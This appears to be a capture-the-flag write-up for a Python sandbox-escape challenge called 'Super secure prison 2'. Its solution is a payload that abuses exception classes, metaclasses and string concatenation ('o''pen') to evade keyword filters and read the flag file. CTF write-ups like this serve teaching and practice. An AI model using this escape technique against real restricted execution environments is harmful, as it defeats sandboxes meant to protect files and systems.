# Super secure prison 2

Look, I know I messed up with the first version of my software. 
I think that this one will be just fine. 
I implemented more validations and it should be enough to keep the bad guys away...right?

> Can you read the flag?

## Solution

```
class Solver(BaseException):
    __contains__ = print
class X(metaclass=Solver): None
try:
    raise Solver
except Solver as solution:
    Solver.__getitem__ = __builtins__.__dict__['o''pen']
    op_file = solution['flag']
    Solver.__getitem__ = op_file.read
    op_file_content = solution[None]
    op_file_content in X
STOP
```